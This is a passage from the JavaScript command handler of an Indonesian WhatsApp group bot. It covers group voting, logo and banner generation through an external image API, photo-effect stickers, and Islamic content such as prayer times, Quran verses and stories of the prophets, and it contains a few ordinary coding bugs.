            if (!m.isGroup) return reply(mess.group)
            if (!(m.chat in vote)) return reply(`_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return reply('Kamu Sudah Vote')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*❑ Uᴘᴠᴏᴛᴇ = Sᴇᴛᴜᴊᴜ*
*❑ Dᴇᴠᴏᴛᴇ = Tɪᴅᴀᴋ Sᴇᴛᴜᴊᴜ*

*◈ Kᴇᴛɪᴋ : #ʜᴀᴘᴜsᴠᴏᴛᴇ - ᴜɴᴛᴜᴋ ᴍᴇɴɢʜᴀᴘᴜs ᴠᴏᴛᴇ*`
            let buttonsUpvote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '👆🏻 UPVOTE'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: 'DEVOTE 👇🏻'}, type: 1}
            ]

            let buttonMessageUpvote = {
                text: teks_vote,
                footer: footer_text,
                buttons: buttonsUpvote,
                headerType: 1,
                mentions: menvote
             }
            tganz.sendMessage(m.chat, buttonMessageUpvote)
	    }
        break
                case 'devote': {
               if (isBan) return reply(mess.ban)
            if (!m.isGroup) return reply(mess.group)
            if (!(m.chat in vote)) return reply(`_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return reply('Kamu Sudah Vote')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*❑ Uᴘᴠᴏᴛᴇ = Sᴇᴛᴜᴊᴜ*
*❑ Dᴇᴠᴏᴛᴇ = Tɪᴅᴀᴋ Sᴇᴛᴜᴊᴜ*

*◈ Kᴇᴛɪᴋ : #ʜᴀᴘᴜsᴠᴏᴛᴇ - ᴜɴᴛᴜᴋ ᴍᴇɴɢʜᴀᴘᴜs ᴠᴏᴛᴇ*`
            let buttonsDevote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '👆🏻 UPVOTE'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: 'DEVOTE 👇🏻'}, type: 1}
            ]

            let buttonMessageDevote = {
                text: teks_vote,
                footer: footer_text,
                buttons: buttonsDevote,
                headerType: 1,
                mentions: menvote
            }
            tganz.sendMessage(m.chat, buttonMessageDevote)
	}
    break
                 
case 'cekvote': {
    if (isBan) return reply(mess.ban)
if (!m.isGroup) return reply(mess.group)
if (!(m.chat in vote)) return reply(`_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`)
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*❑ Uᴘᴠᴏᴛᴇ = Sᴇᴛᴜᴊᴜ*
*❑ Dᴇᴠᴏᴛᴇ = Tɪᴅᴀᴋ Sᴇᴛᴜᴊᴜ*

*◈ Kᴇᴛɪᴋ : #ʜᴀᴘᴜsᴠᴏᴛᴇ - ᴜɴᴛᴜᴋ ᴍᴇɴɢʜᴀᴘᴜs ᴠᴏᴛᴇ*`
tganz.sendTextWithMentions(m.chat, teks_vote, m)
	}
    break
		case 'deletevote': case'delvote': case 'hapusvote': {
               if (isBan) return reply(mess.ban)
            if (!m.isGroup) return reply(mess.group)
            if (!(m.chat in vote)) return reply(`_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`)
            delete vote[m.chat]
            m.reply('Berhasil Menghapus Sesi Vote Di Grup Ini')
	           }
              break
            case 'bannerofapex': {
               if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|bg3`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|bg3`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                var m3 = mon.split("|")[2]
                if (!m3) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|bg3`)
                const style = ['bg6', 'bg5', 'bg4', 'bg3', 'bg2', 'bg1']
                if (!style.includes(m3)) {
                    getStyle(style.length, "background")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        text2: m2,
                        background: m3
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'hapus': 
            case 'delete': 
            case 'd': 
            case 'del': {
               if (isBan) return reply(mess.ban)
          if (!m.quoted) return reply(`*Bᴀʟᴀs ᴘᴇsᴀɴ ʙᴏᴛ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪ ʜᴀᴘᴜs !!!*`)
          let { chat, fromMe, id, isBaileys } = m.quoted
          if (!isBaileys) return reply('*Pᴇsᴀɴ ᴛᴇʀsᴇʙᴜᴛ ʙᴜᴋᴀɴ ᴅᴀʀɪ ʙᴏᴛ !!!*')
          tganz.sendMessage(from, { delete: { remoteJid: from, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
          }
            break
            case 'bannerofpubg': {
               if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|bg2`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|bg2`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                var m3 = mon.split("|")[2]
                if (!m3) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|bg2`)
                const style = ['bg11', 'bg10', 'bg9', 'bg8', 'bg7', 'bg6', 'bg5', 'bg4', 'bg3', 'bg2', 'bg1']
                if (!style.includes(m3)) {
                    getStyle(style.length, "background")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        text2: m2,
                        background: m3
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
             break
            case 'mascotstyle': {
               if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|thumb\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|kitsune`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|thumb\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|kitsune`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                var m3 = mon.split("|")[2]
                if (!m3) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|thumb\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|kitsune`)
                const style = ['dragon-5', 'jet', 'knight', 'skull-3', 'skull-cyborg', 'tiger-4', 'bee-3', 'dragon-4', 'fox-3', 'goat-2', 'kitsune', 'octopus-2', 'piranha', 'wolf', 'bear-2', 'cat', 'ceberus', 'crocodile', 'dinosaur', 'dragon-3', 'eagle-3', 'horse-2', 'husky', 'kraken', 'lynx', 'sabertooh', 'assassin', 'bee', 'cat2', 'demon', 'fox', 'gorilla', 'horus', 'octopus', 'rounin', 'scorpion', 'skull2', 'tiger3', 'tiger2', 'tiger', 'shark', 'sabertooth', 'rooster', 'rhino', 'puma', 'phoenix', 'panther', 'owl', 'lion', 'horse', 'hornet', 'griffin', 'goat', 'fox', 'eagle', 'dragon2', 'dragon', 'devil', 'cobra', 'bull', 'bear', 'monkey', 'warrior', 'rabbit', 'pirates', 'owl2', 'neonwolf', 'lionking', 'godzilla', 'flashwolf', 'fire', 'eagle2', 'dog', 'mask', 'team', 'pubg', 'drift', 'bee2']
                if (!style.includes(m3)) {
                    getStyle(style.length, "thumb")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        text2: m2,
                        thumb: m3
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'logoaccording': {
               if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|thumb\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|lynx`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|thumb\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|lynx`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                var m3 = mon.split("|")[2]
                if (!m3) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|thumb\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|lynx`)
                const style = ['bear2', 'cat2', 'ceberus', 'crocodile', 'dinosaur', 'dragon3', 'eagle3', 'horse2', 'husky', 'kraken', 'lynx', 'sabertooh', 'assassin', 'bee', 'cat', 'demon', 'fox-2', 'gorilla', 'horus', 'octopus', 'rounin', 'scorpion', '-2', 'tiger-3', 'bg-tiger', 'bg-buffalo', 'chicken', 'bull', 'bg-wolf', 'jaguar', 'horse', 'eagle', 'dragon', 'wolver', 'shark', 'sabertooth', 'rhino', 'phoenix', 'lion', 'hornet', 'griffin', 'bear', 'tiger2', 'panther', 'owl', 'monkey', 'goat', 'fox', 'dragon2', 'devil', 'cobra', 'reaper', 'pirates', 'owl2', 'mask', 'fire', 'eagle2', 'chamois', 'neptune', 'parrots', 'samurai']
                if (!style.includes(m3)) {
                    getStyle(style.length, "thumb")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        text2: m2,
                        thumb: m3
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'avataroverwatch': {
               if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|thumb\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|zenyatta`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|thumb\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|zenyatta`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                var m3 = mon.split("|")[2]
                if (!m3) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|thumb\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|zenyatta`)
                const style = ['mccree', 'mercy', 'zenyatta', 'zarya', 'winston', 'widowmaker', 'tracer', 'torbjorn', 'symmetra', 'sombra', 'soldier76', 'soldier_76', 'roadhog', 'reinhardt', 'reaper2', 'reaper', 'pharah', 'orisa', 'mei', 'lucio', 'junkrat', 'hanzo', 'genji', 'dva', 'bastion', 'ana2', 'ana', 'doomfist', 'bg-1']
                if (!style.includes(m3)) {
                    getStyle(style.length, "thumb")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        text2: m2,
                        thumb: m3
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'gay':
            case 'contrast':
            case 'pixelate':
            case 'dither':
            case 'sepia':
            case 'brighten':
            case 'greyscale':
            case 'circle':
            case 'blur':
            case 'invert':
            case 'scale':
            case 'upscale':
            case 'glass':
            case 'wasted':
            case 'passed':
            case 'comrade':
            case 'jail': {
             if (isBan) return reply(mess.ban)
                if (!/image/.test(mime)) return m.reply(`*Kɪʀɪᴍ/Bᴀʟᴀs Gᴀᴍʙᴀʀɴʏᴀ !*`)
                m.reply(mess.wait)
                let dwnld = await tganz.downloadAndSaveMediaMessage(qmsg)
                let { TelegraPh } = require('./lib/uploader')
                let fatGans = await TelegraPh(dwnld)
                let smeme = api('zahwa', '/photoeditor/' + command, { url: fatGans }, 'apikey')
                let FaTiH = await tganz.sendImageAsSticker(m.chat, smeme, m, {
                    packname: global.packname,
                    author: global.author
                })
                await fs.unlinkSync(FaTiH)
            }
            break
            case 'trigger': 
            case 'triggered': 
            case 'triger': {
             if (isBan) return reply(mess.ban)
                if (!/image/.test(mime)) return m.reply(`*Kɪʀɪᴍ/Bᴀʟᴀs Gᴀᴍʙᴀʀɴʏᴀ !*`)
                m.reply(mess.wait)
                let dwnld = await tganz.downloadAndSaveMediaMessage(qmsg)
                let { TelegraPh } = require('./lib/uploader')
                let fatGans = await TelegraPh(dwnld)
                let smeme = api('zahwa', '/photoeditor/triggered', { url: fatGans }, 'apikey')
                let FaTiH = await tganz.sendImageAsSticker(m.chat, smeme, m, {
                    packname: global.packname,
                    author: global.author
                })
                await fs.unlinkSync(FaTiH)
            }
            break
            //image Effect
            case "brazzers":
            case "burn":
            case "ddungeon":
            case "deepfry":
            case "dictator":
            case "fire":
            case "lookwhatkarenhave":
            case "ps4":
            case "redple":
            case "sharpen":
            case "thanos":
            case "sniper":
            case "instagram2":
            case "scary":
            case "moustache":
            case "utatoo":
            case "rip":
            case "wanted":
            case "beautiful":
            case "distort":
            case "glitch3":
            case "approved":
            case "rejected":
            case "3000years": {
               if (isBan) return reply(mess.ban)
                if (!isMedia) return reply(`*Kɪʀɪᴍ/Bᴀʟᴀs Gᴀᴍʙᴀʀɴʏᴀ !*`)
                if (!/webp/.test(mime) && /image/.test(mime)) {
                    reply(mess.wait)
                    var downDl = await tganz.downloadAndSaveMediaMessage(quoted)
                    var upDl = await TelegraPh(downDl)
                    let res = await fetch(global.api("alfa", '/api/image-effect/' + command, {
                        url: upDl
                    }, 'apikey'))
                    if (!res.ok) throw await res.text()
                    let img = await res.buffer()
                    tganz.sendFile(m.chat, img, 'image-effect.jpg', mess.done, m)
                }
                else if (/webp/.test(mime)) {
                    reply(mess.wait)
                    let media = await tganz.downloadAndSaveMediaMessage(quoted)
                    let ran = await './image/toimg-110.png'
                    exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
                        if (err) return reply('Eror')
                        let upDL = await TelegraPh(ran)
                        let res = await fetch(global.api("alfa", '/api/image-effect/' + command, {
                            url: upDl
                        }, 'apikey'))
                        if (!res.ok) throw await res.text()
                        let img = await res.buffer()
                        tganz.sendFile(m.chat, img, 'image-effect.jpg', mess.done, m)
                        await fs.unlinkSync(ran)
                    })
                }
            }
            break
            //islamic
            case 'asmaulhusna': {
               if (isBan) return reply(mess.ban)
                var asma = await fetch(api('alfa', '/api/islam/' + command, {}, 'apikey'))
                if (!asma.ok) throw asma.text()
                var data = await asma.json()
                let key = '*Asmaul Husna*\n\n'
                key += `• Latin : ${data.result.latin}\n`
                key += `• Arabic : ${data.result.arabic}\n`
                key += `• Tr id : ${data.result.translation_id}\n`
                key += `• Tr en : ${data.result.translation_en}`
                reply(key)
            }
            break
            case 'jadwalshalat': {
               if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} nama daerah\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Jakarta`)
                var asma = await fetch(api('alfa', '/api/islam/' + command, {
                    daerah: q
                }, 'apikey'))
                if (!asma.ok) throw asma.text()
                var data = await asma.json()
                let key = '*Jadwal Shalat *\n\n'
                key += `• Daerah : ${q}\n\n`
                key += `• Date : ${moment(new Date()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss DD/MM/YYYY')}\n`
                key += `• Subuh : ${data.result.today.Shubuh}\n`
                key += `• Zuhur : ${data.result.today.Dzuhur}\n`
                key += `• Ashr : ${data.result.today.Ashr}\n`
                key += `• Magrib : ${data.result.today.Maghrib}\n`
                key += `• Isya : ${data.result.today.Isya}\n`
                reply(key)
            }
            break
            case 'searchgc':
            case 'sgc':
            case 'searchgroup':
            case 'carigrup':
            case 'carigc': {
               if (isBan) return reply(mess.ban)
if (args.length < 1) return reply(`Iɴɢɪɴ ᴄᴀʀɪ ɢʀᴜᴘ ᴀᴘᴀ ᴋᴀᴋ ?\nCᴏɴᴛᴏʜ : ${prefix + command} Aɴɪᴍᴇ`)
nae = args.join(" ")
hx.linkwa(nae).then(res => {
teks ='                     *⌂ Hᴀsɪʟ Pᴇɴᴄᴀʀɪᴀɴ Gʀᴜᴘ ⌂*\n\n'
let no = 1
for (let i of res) {
teks +=`⊙═════════⟨ *${no++}* ⟩══════════⊙\n`
teks +=` Nᴀᴍᴀ : *${i.nama}\n`
teks +=` Lɪɴᴋ : ${i.link}\n`
teks +=`⊙══════════════════════⊙\n\n`}
tganz.sendMessage(m.chat, { text: teks }, { quoted: m })
})
}
break
            case 'randomquran': {
               if (isBan) return reply(mess.ban)
                var asma = await fetch(api('alfa', '/api/islam/' + command, {}, 'apikey'))
                if (!asma.ok) throw asma.text()
                var data = await asma.json()
                let short = data.result.resources
                let key = '*Random Quran*\n\n'
                key += `• Surah : ${short.nameOfSurah.short} (${short.nameOfSurah.transliteration.en})\n`
                key += `• Surah ke : ${short.numberOfSurah}\n`
                key += `• Total ayat : ${short.totalAyah}\n`
                key += `• Ayat ke : ${short.numberOfAyah}\n`
                key += `• Arab : ${short.ayah.text.arab}\n`
                key += `• Latin : ${short.ayah.text.transliteration.en}\n`
                key += `• Tr en : ${short.ayah.translation.en}\n`
                key += `• Tr id : ${short.ayah.translation.id}\n\n`
                key += `_*Audio sedang dalam di proses pengiriman*_`
                reply(key)
                let buff = await getBuffer(short.ayah.audio.primary)
                tganz.sendMessage(from, {
                    audio: {
                        url: short.ayah.audio.primary
                    },
                    mimetype: 'audio/aac'
                }, {
                    quoted: m
                })
            }
            break
            case 'jadian': {
            if (isBan) return reply(mess.ban)
            if (!m.isGroup) return reply(mess.group)
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `💗 𝗖𝗶𝗲𝗲 𝘆𝗮𝗻𝗴 𝗷𝗮𝗱𝗶𝗮𝗻 𝗷𝗮𝗻𝗴𝗮𝗻 𝗹𝘂𝗽𝗮 𝗣𝗝 ( 𝗣𝗮𝗷𝗮𝗸 𝗝𝗮𝗱𝗶𝗮𝗻 ), 𝗝𝗮𝗻𝗴𝗮𝗻 𝗯𝗮𝗻𝘆𝗮𝗸 - 𝗯𝗮𝗻𝘆𝗮𝗸. 𝗥𝗽 𝟭 𝗝𝘂𝘁𝗮 𝗮𝗷𝗮 𝗺𝘂𝗿𝗮𝗵 𝗸𝗼𝗸 🗿🙏🏻
            
╔═══════⟨ *Yᴀɴɢ - Jᴀᴅɪᴀɴ* ⟩════════⊙
╠☞ @${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
╚═══════════════════════⊙
            
⫹⫺ Jᴀɴɢᴀɴ ʟᴜᴘᴀ PJɴʏᴀ !!!`
            let menst = [orang, jodoh]
            let buttons = [
                        { buttonId: '.jadian', buttonText: { displayText: '💗 Jᴀᴅɪᴀɴ 💗' }, type: 1 }
                    ]
                    await tganz.sendButtonText(m.chat, buttons, jawab, footer_text, m, {mentions: menst})
            }
            break
            case 'randomquran2': {
               if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} juz 1-30\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} 1`)
                var asma = await fetch(api('alfa', '/api/islam/' + command, {
                    juz: q
                }, 'apikey'))
                if (!asma.ok) throw asma.text()
                var data = await asma.json()
                let short = data.result.resources
                let key = '*Random Quran*\n\n'
                key += `• Surah : ${short.nameOfSurah.short} (${short.nameOfSurah.transliteration.en})\n`
                key += `• Surah ke : ${short.numberOfSurah}\n`
                key += `• Total ayat : ${short.totalAyah}\n`
                key += `• Ayat ke : ${short.numberOfAyah}\n`
                key += `• Arab : ${short.ayah.text.arab}\n`
                key += `• Latin : ${short.ayah.text.transliteration.en}\n`
                key += `• Tr en : ${short.ayah.translation.en}\n`
                key += `• Tr id : ${short.ayah.translation.id}\n\n`
                key += `_*Audio sedang dalam di proses pengiriman*_`
                reply(key)
                tganz.sendMessage(from, {
                    audio: {
                        url: short.ayah.audio.primary
                    },
                    mimetype: 'audio/aac'
                }, {
                    quoted: m
                })
            }
            break
            case 'listsurah': {
               if (isBan) return reply(mess.ban)
                var asma = await fetch(api('alfa', '/api/islam/' + command, {}, 'apikey'))
                if (!asma.ok) throw asma.text()
                var data = await asma.json()
                key = '*List Surah*\n\n'
                reply(key + data.result)
            }
            break
           case 'kisahnabi': {
               if (isBan) return reply(mess.ban)
               if (!text) return reply(`Mᴀᴜ ᴄᴀʀɪ ᴋɪsᴀʜ ɴᴀʙɪ ᴀᴘᴀ ᴋᴀᴋ ?\n*⫹⫺ Cᴏɴᴛᴏʜ : ${prefix + command} Mᴜʜᴀᴍᴍᴀᴅ*`)
                    if (text) {
                    title = text.toLowerCase()
                    let fetch = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Islami/${title}.json`)
                    let teks = `*👳🏻‍♀️ Kɪsᴀʜ :* ${fetch.name}\n*🧬 Uᴍᴜʀ Nᴀʙɪ :* ${fetch.usia} Tahun\n*📆 Lᴀʜɪʀ Tᴀʜᴜɴ :* ${fetch.thn_kelahiran}\n*🏠 Tᴇᴍᴘᴀᴛ Tɪɴɢɢᴀʟ :* ${fetch.tmp}\n\n⊙════════⟨ K I S A H ⟩════════⊙\n\n${fetch.description}\n⊙═════════════════════⊙`
                    tganz.sendFileUrl(m.chat, 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTgwiHFbU4NXgqyn0O3ClMDlOSRUE4dYCcZoQ&usqp=CAU', "", m, { caption: teks })
                } else if (text) {
                    let sections = [{
                        title: "ᴋᴜᴍᴘᴜʟᴀɴ ᴋɪsᴀʜ ᴘᴀʀᴀ ɴᴀʙɪʏᴜʟʟᴀʜ ⸙",
                        rows: [
                            {title: "Kisah Nabi Adam", rowId: ".kisahnabi adam"},
                            {title: "Kisah Nabi Idris", rowId: ".kisahnabi idris"},
                            {title: "Kisah Nabi Nuh", rowId: ".kisahnabi nuh"},
                            {title: "Kisah Nabi Hud", rowId: ".kisahnabi hud"},
                            {title: "Kisah Nabi Sholeh", rowId: ".kisahnabi saleh"},
                            {title: "Kisah Nabi Ibrahim", rowId: ".kisahnabi ibrahim"},
                            {title: "Kisah Nabi Luth", rowId: ".kisahnabi luth"},
                            {title: "Kisah Nabi Ismail", rowId: ".kisahnabi ismail"},
                            {title: "Kisah Nabi Ishaq", rowId: ".kisahnabi ishaq"},
                            {title: "Kisah Nabi Yaqub", rowId: ".kisahnabi yaqub"},
                            {title: "Kisah Nabi Yusuf", rowId: ".kisahnabi yusuf"},
                            {title: "Kisah Nabi Ayyub", rowId: ".kisahnabi ayyub"},
                            {title: "Kisah Nabi Syuaib", rowId: ".kisahnabi syuaib"},
                            {title: "Kisah Nabi Musa", rowId: ".kisahnabi musa"},
                            {title: "Kisah Nabi Harun", rowId: ".kisahnabi harun"},
                            {title: "Kisah Nabi Dzulkifli", rowId: ".kisahnabi dzulkifli"},
                            {title: "Kisah Nabi Daud", rowId: ".kisahnabi daud"},
                            {title: "Kisah Nabi Sulaiman", rowId: ".kisahnabi sulaiman"},
                            {title: "Kisah Nabi Ilyas", rowId: ".kisahnabi ilyas"},
                            {title: "Kisah Nabi Ilyasa", rowId: ".kisahnabi ilyasa"},
                            {title: "Kisah Nabi Yunus", rowId: ".kisahnabi yunus"},
                            {title: "Kisah Nabi Zakariya", rowId: ".kisahnabi zakariya"},
                            {title: "Kisah Nabi Yahya", rowId: ".kisahnabi yahya"},
                            {title: "Kisah Nabi Isa", rowId: ".kisahnabi isa"},
                            {title: "Kisah Nabi Muhammad", rowId: ".kisahnabi muhammad"}
                        ]
                    }]
                    const listMessage = {
                        text: '*⫹⫺ ᴋᴜᴍᴘᴜʟᴀɴ ᴋɪsᴀʜ ᴘᴀʀᴀ ɴᴀʙɪ*',
                        footer: footer_text,
                        buttonText: '👳🏻‍♀️ Kɪsᴀʜ Nᴀʙɪ 👳🏻‍♀️',
                        sections
                    }
                    const sendMsg = await tganz.sendMessage(m.chat, listMessage, { quoted: m })
                }
            }
            break
            case 'alquranaudio': {
               if (isBan) return reply(mess.ban)
